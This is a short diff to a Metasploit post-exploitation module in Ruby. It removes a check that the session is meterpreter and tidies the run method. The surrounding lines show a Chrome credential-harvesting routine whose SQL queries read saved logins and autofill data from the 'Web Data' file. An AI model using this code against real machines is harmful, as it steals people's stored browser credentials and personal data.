@@ -193,19 +193,7 @@ class Metasploit3 < Msf::Post
 		return true
 	end
 
-	def meetRequirements()
-		if session.type != "meterpreter"
-			print_error("Only meterpreter sessions are supported by this post module")
-			return false
-		else
-			return true
-		end
-	end
-
-	def run
-		#Make sure we meet the requirements before running the script
-		return 0 if meetRequirements() == false
-		
+	def run		
 		@chrome_files = [
 			{ :raw => "", :in_file => "Web Data", :sql => "select * from autofill;"},
 			{ :raw => "", :in_file => "Web Data", :sql => "SELECT username_value,origin_url,signon_realm FROM logins;"},
